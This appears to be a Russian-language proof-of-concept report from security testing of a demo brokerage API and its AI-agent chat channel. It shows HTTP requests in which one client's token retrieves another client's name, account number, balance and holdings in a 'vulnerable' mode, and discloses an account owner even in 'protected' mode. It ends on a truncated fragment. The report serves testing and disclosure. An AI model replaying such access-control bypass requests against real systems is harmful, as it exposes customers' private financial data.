# PoC успешных атак — сводный отчёт

Воспроизводится руками. ВВОД (канал) -> ОТВЕТ системы -> РЕЗУЛЬТАТ.

Каналы: **[ЧАТ]** агенту, **[REST]** прямой HTTP к данным, **[ЧАТ+ПАМЯТЬ]** диалог + finalize.

## Воздействие на BAC — данные чужого клиента (слой данных)  `[REST]`

**Ввод:**

```
GET http://localhost:8200/clients/1003
Authorization: Bearer <токен клиента 1001>
X-Demo-Auth-Mode: vulnerable
```

**Ответ системы:**

```
{"cus": "1003", "name": "Сидоров Алексей Викторович", "accounts": [{"account_id": "10456789", "cash_rub": 2450000.0, "positions": [{"isin": "RU0009024277", "amount": 30.0}, {"isin": "RU0009084396", "amount": 1000.0}, {"isin": "RU000A0JWQV5", "amount": 20.0}, {"isin": "RU000A104YT5", "amount": 200.0}]}]}
```

**Результат:** Клиент 1001 получил данные клиента 1003 (отпечатки: ['Сидоров Алексей Викторович', '10456789', '2450000', 'RU0009024277', 'RU0009084396', 'RU000A0JWQV5', 'RU000A104YT5']). Тот же запрос в режиме protected -> HTTP 403.

## Воздействие на BAC — владелец чужого счёта в protected  `[REST]`

**Ввод:**

```
GET http://localhost:8200/accounts/10456789/owner
Authorization: Bearer <токен клиента 1001>
X-Demo-Auth-Mode: protected
```

**Ответ системы:**

```
{"cus": "1003"}
```

**Результат:** Владелец чужого счёта 10456789 раскрыт ДАЖЕ в protected.

**Ввод:**

```

   - Сумма: 205000.0
```
